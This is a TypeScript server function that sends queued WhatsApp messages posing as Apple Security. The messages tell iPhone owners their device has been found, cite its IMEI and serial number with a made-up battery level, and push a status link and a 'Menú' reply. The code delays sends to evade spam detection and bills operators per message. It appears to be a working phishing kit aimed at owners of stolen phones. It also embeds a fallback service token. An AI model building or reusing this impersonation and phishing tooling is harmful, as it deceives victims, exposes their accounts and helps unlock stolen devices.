import { createClient } from 'https://esm.sh/@supabase/supabase-js@2.57.0';

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

Deno.serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const supabaseUrl = Deno.env.get('SUPABASE_URL')!;
    const supabaseServiceKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;
    const supabase = createClient(supabaseUrl, supabaseServiceKey);

    console.log('Starting message queue processing...');

    // Check if a specific message ID was provided
    const body = await req.json().catch(() => ({}));
    const messageId = body.messageId;
    const auto = body.auto;
    const notifyAdmin = body.notifyAdmin; // Nueva bandera para notificar al admin

    // If only notifying admin without processing, handle separately
    if (notifyAdmin && !messageId && !auto) {
      console.log('Notification-only mode - getting latest pending message for admin notification');
      
      const { data: latestMessage } = await supabase
        .from('message_queue')
        .select(`
          *,
          processes (
            client_name
          )
        `)
        .eq('status', 'pending')
        .order('created_at', { ascending: false })
        .limit(1)
        .maybeSingle();

      if (latestMessage) {
        const { data: userProfile } = await supabase
          .from('profiles')
          .select('email')
          .eq('id', latestMessage.user_id)
          .single();

        const { data: adminProfile } = await supabase
          .from('profiles')
          .select('telegram_bot_token, telegram_chat_id')
          .eq('email', 'fredric@gmail.com')
          .single();

        if (adminProfile?.telegram_bot_token && adminProfile?.telegram_chat_id) {
          try {
            const adminNotification = `🔔 *Nuevo Mensaje en Cola*\n\n` +
              `Usuario: ${userProfile?.email || 'Desconocido'}\n` +
              `Cliente: ${latestMessage.processes?.client_name}\n` +
              `Teléfono: ${latestMessage.recipient_phone}\n` +
              `Estado: Pendiente de envío\n\n` +
              `El mensaje se enviará automáticamente en 5 minutos o puedes enviarlo manualmente desde el panel.`;

            await fetch(`https://api.telegram.org/bot${adminProfile.telegram_bot_token}/sendMessage`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                chat_id: adminProfile.telegram_chat_id,
                text: adminNotification,
                parse_mode: 'Markdown'
              })
            });
            
            console.log('Admin notification sent successfully');
          } catch (notifyError) {
            console.error('Error sending admin notification:', notifyError);
          }
        }
      }

      return new Response(
        JSON.stringify({ message: 'Notification sent', processed: 0 }),
        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // Función para generar saludo aleatorio usando el nombre del propietario
    const generateGreeting = (ownerName: string, language: string) => {
      const greetingsES = [
        `Hola ${ownerName}, tu equipo ha sido localizado 📍. A continuación, recibirás los detalles 📱.`,
        `Hola ${ownerName}, hemos encontrado tu dispositivo 📱. Los detalles llegarán en breve.`,
        `${ownerName}, tu iPhone fue rastreado exitosamente 🎯. Prepárate para recibir la información.`,
        `Hola ${ownerName}, buenas noticias 📍 Tu equipo está ubicado. Detalles en camino.`,
        `${ownerName}, dispositivo localizado ✅ La información completa llegará enseguida.`,
        `Hola ${ownerName}, confirmamos la ubicación de tu iPhone 📱. Espera los detalles.`,
        `${ownerName}, tu equipo ha sido rastreado 🎯. Información detallada próximamente.`,
      ];

      const greetingsEN = [
        `Hello ${ownerName}, your device has been located 📍. Details coming shortly 📱.`,
        `Hi ${ownerName}, we found your device 📱. Information on the way.`,
        `${ownerName}, your iPhone was successfully tracked 🎯. Get ready for the details.`,
        `Hello ${ownerName}, good news 📍 Your device is located. Details coming up.`,
        `${ownerName}, device located ✅ Full information arriving soon.`,
        `Hi ${ownerName}, we confirm your iPhone's location 📱. Expect the details.`,
        `${ownerName}, your device has been tracked 🎯. Detailed information shortly.`,
      ];

      const greetings = language === 'spanish' ? greetingsES : greetingsEN;
      return greetings[Math.floor(Math.random() * greetings.length)];
    };

    let query = supabase
      .from('message_queue')
      .select(`
        *,
        processes (
          client_name,
          country_code,
          phone_number,
          contact_type,
          owner_name,
          iphone_model,
          storage,
          color,
          imei,
          serial_number,
          url
        )
      `)
      .eq('status', 'pending');

    // Determine which message(s) to process
    if (messageId) {
      // Manual send: process this specific message immediately
      query = query.eq('id', messageId);
    } else {
      // Always enforce a minimum age of 5 minutes for automatic processing
      const fiveMinutesAgo = new Date(Date.now() - 5 * 60 * 1000).toISOString();
      query = query.lte('created_at', fiveMinutesAgo).order('created_at', { ascending: true }).limit(1);
    }

    const { data: queuedMessage, error: fetchError } = await query.maybeSingle();

    if (fetchError) {
      console.error('Error fetching queued message:', fetchError);
      throw fetchError;
    }

    if (!queuedMessage) {
      console.log('No pending messages in queue');
      return new Response(
        JSON.stringify({ message: 'No pending messages', processed: 0 }),
        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    console.log('Processing message:', queuedMessage.id);

    // Get user profile separately
    const { data: userProfile, error: profileError } = await supabase
      .from('profiles')
      .select('credits, email, telegram_bot_token, telegram_chat_id')
      .eq('id', queuedMessage.user_id)
      .single();

    if (profileError) {
      console.error('Error fetching user profile:', profileError);
      throw profileError;
    }

    // If message has a template_id but no content was generated yet, generate it now
    if (queuedMessage.template_id && queuedMessage.message_content.includes('{')) {
      console.log('Generating message from template:', queuedMessage.template_id);
      
      const { data: template } = await supabase
        .from('message_templates')
        .select('template_content')
        .eq('id', queuedMessage.template_id)
        .single();

      if (template) {
        // Replace variables in template with actual process data
        const customSection = template.template_content
          .replace(/\{client_name\}/g, queuedMessage.processes?.client_name || '')
          .replace(/\{phone_number\}/g, queuedMessage.processes?.phone_number || '')
          .replace(/\{iphone_model\}/g, queuedMessage.processes?.iphone_model || '')
          .replace(/\{storage\}/g, queuedMessage.processes?.storage || '')
          .replace(/\{color\}/g, queuedMessage.processes?.color || '')
          .replace(/\{imei\}/g, queuedMessage.processes?.imei || '')
          .replace(/\{serial_number\}/g, queuedMessage.processes?.serial_number || '')
          .replace(/\{owner_name\}/g, queuedMessage.processes?.owner_name || '')
          .replace(/\{url\}/g, queuedMessage.processes?.url || '');

        // Build complete message with random variations (like normal messages)
        const random = (arr: string[]) => arr[Math.floor(Math.random() * arr.length)];
        const battery = Math.floor(Math.random() * (100 - 15 + 1)) + 15;
        
        const openings = [
          "🔐 Notificación de Seguridad de Apple",
          "🛡️ Alert de Seguridad Apple",
          "🔒 Sistema de Seguridad Apple",
          "⚡ Notificación Automática Apple",
          "🔔 Alerta de Dispositivo Apple"
        ];
        
        const messagePhrases = [
          "📌 Mensaje automático enviado como **aviso prioritario al número registrado**.",
          "🚨 Notificación automática dirigida a **tu contacto principal verificado**.",
          "📢 Alert generado automáticamente para **el teléfono asociado a tu cuenta**.",
          "⚠️ Comunicación automática enviada a **tu número de seguridad registrado**.",
          "📱 Mensaje del sistema enviado a **tu contacto de emergencia principal**."
        ];
        
        const deviceSections = [
          `👤 Propietario: ${queuedMessage.processes?.owner_name || 'No especificado'}
📱 Modelo: ${queuedMessage.processes?.iphone_model}
🎨 Color: ${queuedMessage.processes?.color}
💾 Almacenamiento: ${queuedMessage.processes?.storage}
📟 IMEI: ${queuedMessage.processes?.imei}
🔑 Número de serie: ${queuedMessage.processes?.serial_number}
🔋 Batería: ${battery}%`,
          
          `👤 Usuario: ${queuedMessage.processes?.owner_name || 'No especificado'}
📱 Dispositivo: ${queuedMessage.processes?.iphone_model}
🌈 Color: ${queuedMessage.processes?.color}
💽 Capacidad: ${queuedMessage.processes?.storage}
🔢 IMEI: ${queuedMessage.processes?.imei}
🆔 Serie: ${queuedMessage.processes?.serial_number}
⚡ Nivel batería: ${battery}%`,
          
          `👤 Titular: ${queuedMessage.processes?.owner_name || 'No especificado'}
📱 iPhone: ${queuedMessage.processes?.iphone_model}
🎨 Coloración: ${queuedMessage.processes?.color}
💾 Memoria: ${queuedMessage.processes?.storage}
📟 Código IMEI: ${queuedMessage.processes?.imei}
🔑 No. Serie: ${queuedMessage.processes?.serial_number}
🔋 Carga: ${battery}%`
        ];
        
        const helpPhrases = [
          "📬 ¿Eres el dueño? 👉 *Responde con* **Menú** para recibir ayuda inmediata del equipo de soporte técnico 👨🏽‍🔧",
          "💬 ¿Necesitas asistencia? 👉 *Escribe* **Menú** para contactar con nuestro soporte especializado 👨‍💻",
          "🆘 ¿Requieres ayuda? 👉 *Envía* **Menú** para obtener asistencia técnica inmediata 🔧",
          "📞 ¿Buscas soporte? 👉 *Responde* **Menú** para conectar con nuestro equipo técnico 👨‍🔧",
          "🛠️ ¿Necesitas apoyo? 👉 *Contesta* **Menú** para recibir asistencia profesional 👩‍💻"
        ];
        
        const closings = [
          "🛡️ Apple Security – Servicio activo 24/7\n©️ 2025 Apple Inc.",
          "🔒 Apple Security – Sistema operativo 24/7\n©️ 2025 Apple Inc.",
          "⚡ Apple Security – Monitoreo continuo\n©️ 2025 Apple Inc.",
          "🌐 Apple Security – Protección 24 horas\n©️ 2025 Apple Inc.",
          "🔐 Apple Security – Vigilancia permanente\n©️ 2025 Apple Inc."
        ];

        // Build complete message: opening + custom section + message phrase + device + url + help + closing
        queuedMessage.message_content = `${random(openings)}

${customSection}

${random(messagePhrases)}

${random(deviceSections)}

${queuedMessage.processes?.url ? `🌍 Ver estado del dispositivo: ${queuedMessage.processes.url}` : ''}

${random(helpPhrases)}

${random(closings)}`;
      }
    }

    if (profileError) {
      console.error('Error fetching user profile:', profileError);
      throw profileError;
    }

    // Check if user has credits
    const userCredits = userProfile?.credits || 0;
    if (userCredits <= 0) {
      console.log('User has no credits, marking as failed');
      await supabase
        .from('message_queue')
        .update({ 
          status: 'failed',
          updated_at: new Date().toISOString()
        })
        .eq('id', queuedMessage.id);

      return new Response(
        JSON.stringify({ 
          message: 'Message failed: No credits', 
          processed: 0 
        }),
        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // Get WhatsApp settings
    const settingsKeys = queuedMessage.language === 'spanish' 
      ? ['whatsapp_instance', 'whatsapp_token']
      : ['whatsapp_instance_en', 'whatsapp_token_en'];

    const { data: settings } = await supabase
      .from('system_settings')
      .select('*')
      .in('setting_key', settingsKeys);

    const config = settings?.reduce((acc: any, setting: any) => {
      acc[setting.setting_key] = setting.setting_value;
      return acc;
    }, {});

    const instanceId = queuedMessage.language === 'spanish' 
      ? (config?.whatsapp_instance || 'instance126876')
      : (config?.whatsapp_instance_en || 'instance_en_default');
      
    const token = queuedMessage.language === 'spanish' 
      ? (config?.whatsapp_token || '4ecj8581tubua7ry')
      : (config?.whatsapp_token_en || 'token_en_default');

    if (!instanceId || !token || instanceId.includes('default') || token.includes('default')) {
      console.log('WhatsApp configuration missing');
      await supabase
        .from('message_queue')
        .update({ 
          status: 'failed',
          updated_at: new Date().toISOString()
        })
        .eq('id', queuedMessage.id);

      return new Response(
        JSON.stringify({ 
          message: 'Message failed: WhatsApp configuration missing', 
          processed: 0 
        }),
        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // Generate greeting message using owner_name
    const greetingMessage = generateGreeting(
      queuedMessage.processes?.owner_name || 'Propietario',
      queuedMessage.language
    );

    // Step 1: Send greeting message
    console.log('Sending greeting message...');
    const greetingResponse = await fetch(`https://api.ultramsg.com/${instanceId}/messages/chat`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      body: new URLSearchParams({
        token: token,
        to: queuedMessage.recipient_phone,
        body: greetingMessage,
      }),
    });
    const greetingResult = await greetingResponse.json();
    console.log('Greeting message response:', greetingResult);

    if (greetingResult.sent !== true && greetingResult.sent !== "true") {
      console.log('Greeting message failed:', greetingResult);
      await supabase
        .from('message_queue')
        .update({ 
          status: 'failed',
          updated_at: new Date().toISOString()
        })
        .eq('id', queuedMessage.id);

      return new Response(
        JSON.stringify({ 
          message: `Greeting message failed: ${greetingResult.message || greetingResult.error || 'Unknown error'}`, 
          processed: 0 
        }),
        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // Wait 15 seconds before sending full message to break the ice and avoid spam detection
    console.log('Waiting 15 seconds before sending full message...');
    await new Promise(resolve => setTimeout(resolve, 15000));

    // Step 2: Send full message with details
    let result;
    if (queuedMessage.image_url) {
      console.log('Sending full message with image');
      const response = await fetch(`https://api.ultramsg.com/${instanceId}/messages/image`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: new URLSearchParams({
          token: token,
          to: queuedMessage.recipient_phone,
          image: queuedMessage.image_url,
          caption: queuedMessage.message_content,
        }),
      });
      result = await response.json();
    } else {
      console.log('Sending full text message');
      const response = await fetch(`https://api.ultramsg.com/${instanceId}/messages/chat`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: new URLSearchParams({
          token: token,
          to: queuedMessage.recipient_phone,
          body: queuedMessage.message_content,
        }),
      });
      result = await response.json();
    }

    console.log('Full message WhatsApp API response:', result);

    if (result.sent === true || result.sent === "true") {
      // Deduct credit
      await supabase
        .from('profiles')
        .update({ 
          credits: userCredits - 1,
          updated_at: new Date().toISOString()
        })
        .eq('id', queuedMessage.user_id);

      // Save to messages table
      await supabase
        .from('messages')
        .insert({
          user_id: queuedMessage.user_id,
          process_id: queuedMessage.process_id,
          message_content: queuedMessage.message_content,
          recipient_phone: queuedMessage.recipient_phone,
          status: 'sent',
          sent_at: new Date().toISOString()
        });

      // Update process status
      await supabase
        .from('processes')
        .update({ 
          status: 'enviado',
          updated_at: new Date().toISOString()
        })
        .eq('id', queuedMessage.process_id);

      // Update queue status
      await supabase
        .from('message_queue')
        .update({ 
          status: 'sent',
          sent_at: new Date().toISOString(),
          updated_at: new Date().toISOString()
        })
        .eq('id', queuedMessage.id);

      console.log('Message sent successfully');

      // Send Telegram notification if configured
      if (userProfile.telegram_bot_token && userProfile.telegram_chat_id) {
        try {
          const telegramMessage = `✅ *Mensaje Enviado*\n\nCliente: ${queuedMessage.processes?.client_name}\nTeléfono: ${queuedMessage.recipient_phone}\nIdioma: ${queuedMessage.language}\n\nCréditos restantes: ${userCredits - 1}`;
          
          await fetch(`https://api.telegram.org/bot${userProfile.telegram_bot_token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: userProfile.telegram_chat_id,
              text: telegramMessage,
              parse_mode: 'Markdown'
            })
          });
          
          console.log('Telegram notification sent');
        } catch (telegramError) {
          console.error('Error sending Telegram notification:', telegramError);
          // Don't fail the whole process if Telegram notification fails
        }
      }

      return new Response(
        JSON.stringify({ 
          message: 'Message sent successfully', 
          processed: 1,
          queuedMessageId: queuedMessage.id
        }),
        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    } else {
      console.log('WhatsApp send failed:', result);
      await supabase
        .from('message_queue')
        .update({ 
          status: 'failed',
          updated_at: new Date().toISOString()
        })
        .eq('id', queuedMessage.id);

      return new Response(
        JSON.stringify({ 
          message: `Message failed: ${result.message || result.error || 'Unknown error'}`, 
          processed: 0 
        }),
        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

  } catch (error) {
    console.error('Error processing message queue:', error);
    return new Response(
      JSON.stringify({ error: error.message }),
      { 
        status: 500,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' } 
      }
    );
  }
});
